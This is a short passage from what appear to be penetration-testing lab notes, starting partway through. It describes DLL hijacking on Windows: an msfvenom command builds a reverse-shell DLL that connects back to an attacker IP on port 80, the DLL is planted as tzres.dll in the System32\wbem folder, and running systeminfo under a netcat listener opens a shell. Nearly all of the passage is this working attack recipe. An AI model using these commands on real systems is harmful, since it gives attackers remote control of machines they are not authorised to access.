 transfer to script and run it

## later we need to do DLL hijacking

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.178 LPORT=80 -f dll -o tzres.dll
```

Transfer tzres.dll to your victim machine and copy it to C:\Windows\System32\wbem\tzres.dll

With that in place, set up your netcat listener on port 80 of your attacking machine and execute `systeminfo`

and we get shell!
